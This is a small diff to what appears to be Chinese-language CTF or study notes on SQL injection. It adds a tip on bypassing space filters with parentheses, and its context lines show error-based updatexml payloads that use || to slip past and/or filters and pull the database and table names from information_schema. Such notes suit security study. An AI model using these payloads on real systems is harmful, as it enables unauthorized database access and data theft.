@@ -97,6 +97,7 @@ print("All:", column)
 一般是报错回显。
 ```
 and or 被过滤，使用||，&&，^等
+过滤空格使用括号
 123"||(updatexml(1,concat('~',(select(database()))),1))#
 
 123"||(updatexml(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema='web_sqli'))),1))#
